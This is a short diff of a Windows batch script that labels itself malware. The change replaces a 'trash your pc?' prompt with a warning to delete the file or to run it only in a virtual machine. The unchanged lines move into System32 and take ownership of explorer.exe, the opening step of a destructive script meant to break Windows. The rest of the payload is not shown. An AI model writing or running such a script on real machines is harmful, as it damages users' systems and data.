@@ -1,5 +1,5 @@
 @echo off 
-echo trash your pc?
+echo your about to run a malware if you got send this close and delete it immediately! if your in virtualmachine press any key
 pause
 cd C:\windows\system32
 takeown /f C:\windows\explorer.exe
